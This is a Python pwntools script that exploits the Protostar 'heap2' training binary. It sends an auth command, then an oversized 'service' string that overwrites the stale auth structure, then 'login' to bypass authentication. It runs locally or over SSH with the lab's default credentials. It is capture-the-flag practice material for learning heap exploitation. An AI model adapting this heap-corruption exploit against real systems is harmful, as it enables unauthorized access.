#!/usr/bin/env python

from pwn import *
import sys

e = ELF('./heap2')
def exploit(r):
  print(r.recv())
  r.send("auth admin\n")        # use any auth
  print(r.recv())               # because auth is too small no need to use
                                # reset to free the auth
  r.send("service AAAAAAAAAAAAAAAAAAAAA\n") # pointer to auth is still
  print(r.recv())                           # is still stored and now
                                            # int auth has been overwritten
  r.send("login\n")
  print(r.recv())
  r.close()
def remote(ipAddr):
  s = ssh("user", ipAddr, 22, password="user")
  r = s.run('/opt/protostar/bin/heap2')
  
  exploit(r)
def local():
  r = process([e.path])
  exploit(r)

if len(sys.argv) < 2:
  print("usage: ./%s <mode or ip>" % sys.argv[0])

elif sys.argv[1] == "local":
  local()

else:
  remote(sys.argv[1])

